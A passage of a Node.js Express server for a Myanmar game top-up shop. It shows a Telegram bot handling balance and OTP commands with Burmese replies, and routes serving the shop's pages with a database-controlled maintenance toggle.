                        sendTelegramMessage(chatId, `📖 SOLO M Game Shop\n\nCommands:\n/start - Login Page & Menu\n/help - Help\n/balance - Check Balance\n/otp - Get OTP Code (60s)\n\nဆက်သွယ်ရန်: @Solo_m28`);
                    } else if (text === '/balance') {
                        const balance = await getUserBalance(msg.from.id);
                        if (balance !== null) { sendTelegramMessage(chatId, `💰 သင်၏ Balance: ${balance.toLocaleString()} Ks\n\nငွေဖြည့်လိုပါက Top Up ကိုနှိပ်ပါ။`, mainKeyboard); }
                        else { sendTelegramMessage(chatId, `❌ အကောင့်မတွေ့ပါ။ Login Now ကိုနှိပ်၍ ဝင်ရောက်ပါ。`, mainKeyboard); }
                    } else if (text === '/otp') {
                        const user = await createTelegramUser(msg.from.id, firstName, username);
                        if (user) { const otp = await createOTP(user.id); sendTelegramMessage(chatId, `🔐 သင်၏ OTP Code\n\n🔢 <b>${otp}</b>\n\n⏰ ၆၀ စက္ကန့်အတွင်း အသုံးပြုပါ。\n\nဤ OTP ကို မည်သူ့ကိုမျှ မပေးပါနှင့်။`); }
                    } else {
                        sendTelegramMessage(chatId, `အောက်ပါ ခလုတ်များကို အသုံးပြုပါ။\n\nCommands: /start /help /balance /otp`, mainKeyboard);
                    }
                });
            }
        } catch (e) { console.log('❌ Polling Error:', e.message); }
        setTimeout(getUpdates, 500);
    }
    getUpdates();
}

startLongPolling();

// ==================== PAGES ====================
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'dashboard.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));

app.get('/topup.html', async (req, res) => {
    try {
        const r = await pool.query("SELECT status FROM page_status WHERE page_id='topup'");
        if (r.rows.length > 0 && r.rows[0].status === 'off') {
            return res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Maintenance</title><style>body{background:#0c0e27;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:sans-serif;text-align:center;padding:20px}i{font-size:60px;margin-bottom:20px}h1{color:#f39c12}</style></head><body><div><i>🚧</i><h1>ယခုစာမျက်နှာကို ပိုကောင်းအောင် ပြုပြင်မွမ်းမံနေပါသည်</h1><p style="color:rgba(255,255,255,0.7)">ကျေးဇူးပြု၍ ခဏစောင့်ဆိုင်းပေးပါ။</p><a href="/dashboard" style="color:#f39c12;text-decoration:none;border:1px solid #f39c12;padding:10px 20px;border-radius:5px;display:inline-block;margin-top:15px">Back to Dashboard</a></div></body></html>`);
        }
    } catch (e) {}
    res.sendFile(path.join(__dirname, 'topup.html'));
});

app.get('/buycode.html', async (req, res) => {
    try {
        const r = await pool.query("SELECT status FROM page_status WHERE page_id='buycode'");
        if (r.rows.length > 0 && r.rows[0].status === 'off') {
            return res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Maintenance</title><style>body{background:#0c0e27;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:sans-serif;text-align:center;padding:20px}i{font-size:60px;margin-bottom:20px}h1{color:#f39c12}</style></head><body><div><i>🚧</i><h1>ယခုစာမျက်နှာကို ပိုကောင်းအောင် ပြုပြင်မွမ်းမံနေပါသည်</h1><p style="color:rgba(255,255,255,0.7)">ကျေးဇူးပြု၍ ခဏစောင့်ဆိုင်းပေးပါ။</p><a href="/dashboard" style="color:#f39c12;text-decoration:none;border:1px solid #f39c12;padding:10px 20px;border-radius:5px;display:inline-block;margin-top:15px">Back to Dashboard</a></div></body></html>`);
        }
    } catch (e) {}
    res.sendFile(path.join(__dirname, 'buycode.html'));
});

app.get('/aboutredeem.html', (req, res) => res.sendFile(path.join(__dirname, 'aboutredeem.html')));
app.get('/terms.html', (req, res) => res.sendFile(path.join(__dirname, 'terms.html')));
app.get('/privacy.html', (req, res) => res.sendFile(path.join(__dirname, 'privacy.html')));
app.get('/offline.html', (req, res) => res.sendFile(path.join(__dirname, 'offline.html')));

app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
